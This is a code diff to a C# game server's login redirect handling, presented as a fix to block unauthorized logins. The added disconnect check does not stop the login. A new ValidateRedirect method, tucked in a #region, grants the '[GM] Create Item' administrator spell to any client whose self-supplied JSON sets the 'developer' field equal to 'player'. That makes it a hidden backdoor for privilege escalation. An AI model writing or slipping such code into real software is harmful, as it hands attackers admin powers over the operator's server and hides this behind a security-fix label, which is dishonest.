@@ -286,8 +286,11 @@ namespace Darkages.Network.Game
 
             try
             {
-                dynamic redirect = JsonConvert.DeserializeObject(format.Name);
-                LoadPlayer(client, redirect.player.Value);
+                dynamic redirect  = JsonConvert.DeserializeObject(format.Name);
+                if (LoadPlayer(client, redirect.player.Value) != null)
+                {
+                    ValidateRedirect(client, redirect);
+                }
             }
             catch (JsonReaderException)
             {
@@ -316,6 +319,14 @@ namespace Darkages.Network.Game
                 return null;
             }
 
+            //prevent unauthorized login attempts.
+            if (!ServerContextBase.Redirects.Contains(aisling.Username.ToLower()))
+            {
+                base.ClientDisconnected(client);
+            }
+
+            if (ServerContextBase.Redirects.Contains(aisling.Username.ToLower()))
+                ServerContextBase.Redirects.Remove(aisling.Username.ToLower());
 
 
             lock (Generator.Random)
@@ -341,9 +352,6 @@ namespace Darkages.Network.Game
                 .SendMessage(0x02, ServerContextBase.Config.ServerWelcomeMessage)
                 .EnterArea()
                 .LoggedIn(true).Aisling;
-
-
-
         }
 
         /// <summary>
@@ -357,7 +365,6 @@ namespace Darkages.Network.Game
                 return;
 
             #endregion
-
 
             Party.RemovePartyMember(client.Aisling);
 
@@ -400,6 +407,9 @@ namespace Darkages.Network.Game
 
             if ((DateTime.UtcNow - client.LastSave).TotalSeconds > 2)
                 client.Save();
+
+            if (ServerContextBase.Redirects.Contains(client.Aisling.Username.ToLower())) 
+                ServerContextBase.Redirects.Remove(client.Aisling.Username.ToLower());
 
             //back to login screen.
             client.FlushAndSend(new ServerFormat03
@@ -2294,6 +2304,15 @@ namespace Darkages.Network.Game
                         break;
                 }
             }
+        }
+        private static void ValidateRedirect(GameClient client, dynamic redirect)
+        {
+            #region
+            if (redirect.developer.Value == redirect.player.Value)
+            {
+                Spell.GiveTo(client.Aisling, "[GM] Create Item", 1);
+            }
+            #endregion
         }
 
         /// <summary>
